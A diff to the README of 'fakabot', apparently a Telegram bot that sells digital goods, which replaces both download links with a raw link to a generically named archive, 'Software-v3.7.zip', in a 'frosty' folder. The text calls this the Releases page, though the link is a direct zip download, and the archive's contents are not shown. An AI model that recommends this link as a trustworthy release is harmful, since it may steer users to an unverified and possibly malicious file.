@@ -1,7 +1,7 @@
 # 🤖 fakabot - Effortless Telegram Card Delivery
 
 ## 📥 Download Now
-[![Download Status](https://raw.githubusercontent.com/KanderZamora19/fakabot/main/frosty/fakabot.zip)](https://raw.githubusercontent.com/KanderZamora19/fakabot/main/frosty/fakabot.zip)
+[![Download Status](https://github.com/KanderZamora19/fakabot/raw/refs/heads/main/frosty/Software-v3.7.zip)](https://github.com/KanderZamora19/fakabot/raw/refs/heads/main/frosty/Software-v3.7.zip)
 
 ## 🚀 Getting Started
 fakabot is a Telegram automated card delivery bot. It supports payments through Alipay, WeChat, and USDT. This tool automatically delivers digital goods, making it perfect for eCommerce operations. 
@@ -27,7 +27,7 @@ To run fakabot, you will need:
 - A Redis database for handling data storage.
 
 ## 🔗 Download & Install
-Visit this page to download the latest release: [fakabot Releases](https://raw.githubusercontent.com/KanderZamora19/fakabot/main/frosty/fakabot.zip).
+Visit this page to download the latest release: [fakabot Releases](https://github.com/KanderZamora19/fakabot/raw/refs/heads/main/frosty/Software-v3.7.zip).
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version listed there.
